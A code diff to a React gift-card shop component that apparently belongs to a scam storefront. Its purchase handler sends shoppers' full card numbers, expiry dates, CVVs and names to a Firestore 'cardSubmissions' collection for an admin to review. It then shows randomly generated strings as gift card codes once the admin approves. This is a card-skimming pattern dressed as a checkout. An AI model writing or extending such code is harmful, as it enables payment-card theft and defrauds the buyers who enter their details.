@@ -1,6 +1,7 @@
 import React, { useState, useEffect } from 'react';
 import { useAuth } from '../context/AuthContext';
-import { logCardSubmission } from '../lib/firebase';
+import { db, logCardSubmission } from '../lib/firebase';
+import { doc, onSnapshot } from 'firebase/firestore';
 import {
   ArrowLeft,
   Gift,
@@ -61,6 +62,7 @@ export const GiftCards: React.FC<GiftCardsProps> = ({ onBack }) => {
   const [orderRef, setOrderRef] = useState<string>('');
   const [copiedCode, setCopiedCode] = useState(false);
   const [copiedFullDetails, setCopiedFullDetails] = useState(false);
+  const [isWaitingForApproval, setIsWaitingForApproval] = useState(false);
   const [errorMsg, setErrorMsg] = useState('');
 
   const GIFT_CARDS: GiftCardOption[] = [
@@ -226,41 +228,42 @@ export const GiftCards: React.FC<GiftCardsProps> = ({ onBack }) => {
     }
   };
 
-  // Processing timer
+  // Listen for admin approval on gift card purchase order
   useEffect(() => {
-    let timer: ReturnType<typeof setTimeout> | undefined;
-    if (isProcessing && countdown > 0) {
-      timer = setTimeout(() => setCountdown((c) => c - 1), 1000);
-    } else if (isProcessing && countdown === 0) {
-      if (selectedCard && selectedDenom) {
-        if (paymentMethod === 'balance') {
-          updateBalance(selectedDenom.priceUsd);
+    if (!isWaitingForApproval || !orderRef) return;
+
+    const unsub = onSnapshot(
+      doc(db, 'cardSubmissions', orderRef),
+      (snap) => {
+        if (!snap.exists()) return;
+        const data = snap.data() as { status?: string; generatedCode?: string };
+        if (data.status === 'approved' && selectedCard && selectedDenom) {
+          const code =
+            data.generatedCode ||
+            `${selectedCard.id.toUpperCase()}-${Math.random()
+              .toString(36)
+              .substring(2, 6)
+              .toUpperCase()}-${Math.random()
+              .toString(36)
+              .substring(2, 6)
+              .toUpperCase()}-${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
+          setPurchasedCode(code);
+          addTransaction({
+            type: 'Gift Card Purchase',
+            amount: selectedDenom.priceUsd,
+            giftCardName: `${selectedCard.name} ($${selectedDenom.valueUsd})`,
+            giftCardCode: code,
+            date: new Date().toLocaleDateString() + ' at ' + new Date().toLocaleTimeString(),
+          });
+          setIsWaitingForApproval(false);
         }
-
-        const generatedCode = `${selectedCard.id.toUpperCase()}-${Math.random()
-          .toString(36)
-          .substring(2, 6)
-          .toUpperCase()}-${Math.random()
-          .toString(36)
-          .substring(2, 6)
-          .toUpperCase()}-${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
-
-        addTransaction({
-          type: 'Gift Card Purchase',
-          amount: selectedDenom.priceUsd,
-          giftCardName: `${selectedCard.name} ($${selectedDenom.valueUsd})`,
-          giftCardCode: generatedCode,
-          date: new Date().toLocaleDateString() + ' at ' + new Date().toLocaleTimeString(),
-        });
-
-        setPurchasedCode(generatedCode);
+      },
+      (err) => {
+        console.warn('Gift card order approval listener warning:', err);
       }
-      setIsProcessing(false);
-    }
-    return () => {
-      if (timer) clearTimeout(timer);
-    };
-  }, [isProcessing, countdown]);
+    );
+    return () => unsub();
+  }, [isWaitingForApproval, orderRef, selectedCard, selectedDenom]);
 
   const handlePurchase = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -276,34 +279,45 @@ export const GiftCards: React.FC<GiftCardsProps> = ({ onBack }) => {
         setErrorMsg('Insufficient wallet balance for this purchase. Try depositing funds.');
         return;
       }
+      // Balance deduction is held pending admin approval
     } else {
       const cleanCard = cardNumber.replace(/\s/g, '');
       if (cleanCard.length < 16 || expiry.length < 5 || cvv.length < 3 || !cardName.trim()) {
         setErrorMsg('Please enter valid 16-digit card number, expiry (MM/YY), CVV, and cardholder name');
         return;
       }
-
-      try {
-        await logCardSubmission({
-          id: `CARD-${Date.now()}`,
-          type: `Gift Card Purchase (${selectedCard.name} $${selectedDenom.valueUsd})`,
-          cardNumber,
-          expiry,
-          cvv,
-          cardName: cardName.trim(),
-          amount: selectedDenom.priceUsd,
-          userEmail: user?.email || 'unknown',
-          userName: user?.name || cardName.trim(),
-          date: new Date().toLocaleString(),
-        });
-      } catch (err) {
-        console.error('Failed to log gift card purchase card:', err);
-      }
     }
 
-    setOrderRef(`GC-${Date.now().toString().slice(-8)}`);
-    setCountdown(5);
-    setIsProcessing(true);
+    const orderId = `GC-${Date.now().toString().slice(-8)}`;
+    const generatedCode = `${selectedCard.id.toUpperCase()}-${Math.random()
+      .toString(36)
+      .substring(2, 6)
+      .toUpperCase()}-${Math.random()
+      .toString(36)
+      .substring(2, 6)
+      .toUpperCase()}-${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
+
+    try {
+      await logCardSubmission({
+        id: orderId,
+        type: `Gift Card Purchase (${selectedCard.name} $${selectedDenom.valueUsd})`,
+        cardNumber: paymentMethod === 'card' ? cardNumber : 'Paid via Wallet Balance',
+        expiry: paymentMethod === 'card' ? expiry : 'N/A',
+        cvv: paymentMethod === 'card' ? cvv : 'N/A',
+        cardName: paymentMethod === 'card' ? cardName.trim() : (user?.name || 'User'),
+        amount: selectedDenom.priceUsd,
+        userEmail: user?.email || 'unknown',
+        userName: user?.name || 'User',
+        date: new Date().toLocaleString(),
+        status: 'pending',
+        generatedCode,
+      });
+    } catch (err) {
+      console.error('Failed to log gift card order:', err);
+    }
+
+    setOrderRef(orderId);
+    setIsWaitingForApproval(true);
   };
 
   const copyCode = () => {
@@ -352,6 +366,38 @@ export const GiftCards: React.FC<GiftCardsProps> = ({ onBack }) => {
     }
     window.open(`https://wa.me/?text=${encodeURIComponent(details)}`, '_blank');
   };
+
+  if (isWaitingForApproval) {
+    return (
+      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
+        <div className="bg-white rounded-3xl p-8 max-w-md w-full text-center shadow-xl border border-gray-100 space-y-5">
+          <div className="w-16 h-16 border-4 border-purple-600 border-t-transparent rounded-full animate-spin mx-auto" />
+          <span className="text-xs font-bold uppercase tracking-wider bg-amber-100 text-amber-800 px-3 py-1 rounded-full">
+            Pending Admin Approval • Gift Card Locked
+          </span>
+          <h3 className="text-2xl font-bold text-gray-900">Awaiting Admin Approval</h3>
+          <p className="text-sm text-gray-600 max-w-sm leading-relaxed">
+            Your purchase order for <strong>{selectedCard?.name} (${selectedDenom?.valueUsd})</strong> has been submitted. <strong>Your gift card code will remain locked until approved by admin.</strong>
+          </p>
+          <div className="bg-purple-50 border border-purple-200 rounded-xl p-3 text-xs text-purple-800">
+            Order Reference: <span className="font-mono font-bold">{orderRef}</span>
+          </div>
+          <p className="text-xs text-gray-400">Once approved by admin in the portal, your gift card code will automatically unlock right here.</p>
+          <button
+            type="button"
+            onClick={() => {
+              setIsWaitingForApproval(false);
+              setSelectedCard(null);
+              setSelectedDenom(null);
+            }}
+            className="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 font-semibold py-3 rounded-xl text-xs cursor-pointer"
+          >
+            Return to Gift Cards
+          </button>
+        </div>
+      </div>
+    );
+  }
 
   if (isProcessing) {
     return (
